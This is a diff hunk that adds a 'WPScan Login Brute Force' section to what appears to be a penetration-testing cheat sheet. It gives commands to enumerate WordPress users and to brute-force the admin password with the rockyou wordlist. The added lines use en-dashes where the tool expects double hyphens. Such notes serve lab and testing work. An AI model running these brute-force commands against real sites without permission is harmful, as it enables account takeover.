@@ -478,6 +478,11 @@ wpscan --url [http://192.168.243.244](http://192.168.243.244) --enumerate p --pl
 wpscan --url http://ipaddress.of.website/ --enumerate vp --api-token API-TOKEN
 <example>
 
+# WPScan Login Brute Force
+First collect usernames
+wpscan –url 192.168.189.142 –enumerate u
+Use Wordlist to bruteforce the user password
+wpscan –url 192.168.189.142 –wordlist /usr/share/wordlists/rockyou.txt –username admin
 
 
 # Hydra
